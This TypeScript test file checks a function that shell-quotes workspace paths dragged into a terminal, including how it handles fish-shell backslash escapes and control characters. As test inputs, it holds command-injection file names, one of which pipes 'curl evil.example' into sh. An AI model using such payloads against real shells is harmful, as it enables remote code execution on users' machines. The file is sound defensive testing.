import {
  WORKSPACE_PATH_DRAG_MIME,
  formatWorkspacePathForTerminal,
} from '@/features/ai-task/services/TerminalPathFormatter'

describe('formatWorkspacePathForTerminal', () => {
  test('exports a feature-specific drag MIME type', () => {
    expect(WORKSPACE_PATH_DRAG_MIME).toBe('application/x-taskchute-workspace-path')
  })

  test('single-quotes a path and appends one insertion space', () => {
    expect(formatWorkspacePathForTerminal('/tmp/My Project/read me.md')).toBe(
      "'/tmp/My Project/read me.md' ",
    )
  })

  test('escapes an embedded single quote without exposing shell metacharacters', () => {
    expect(formatWorkspacePathForTerminal("/tmp/it's;$(touch pwned).md")).toBe(
      "'/tmp/it'\"'\"'s;$(touch pwned).md' ",
    )
  })

  // LEV-387: fish reads \' and \\ as escapes inside single quotes, so this
  // name would end the quoting early there and run curl … | sh.
  test('rejects a backslash off Windows, which fish reads as an escape', () => {
    expect(() =>
      formatWorkspacePathForTerminal('/repo/x\\\'";curl evil.example|sh;#'),
    ).toThrow('backslash')
    expect(() => formatWorkspacePathForTerminal('/repo/a\\b.md')).toThrow('backslash')
  })

  test('keeps a Windows path with its backslashes', () => {
    expect(
      formatWorkspacePathForTerminal('C:\\Users\\me\\read me.md', { windows: true }),
    ).toBe("'C:\\Users\\me\\read me.md' ")
  })

  test('rejects NUL instead of writing a truncated path to the terminal', () => {
    expect(() => formatWorkspacePathForTerminal('/tmp/safe\0hidden')).toThrow(
      'control',
    )
  })

  test.each([
    ['ETX', '\u0003'],
    ['tab', '\t'],
    ['line feed', '\n'],
    ['carriage return', '\r'],
    ['escape', '\u001b'],
    ['delete', '\u007f'],
  ])('rejects %s before the TTY can interpret it', (_label, control) => {
    expect(() =>
      formatWorkspacePathForTerminal(`/tmp/before${control}after`),
    ).toThrow('control')
  })
})
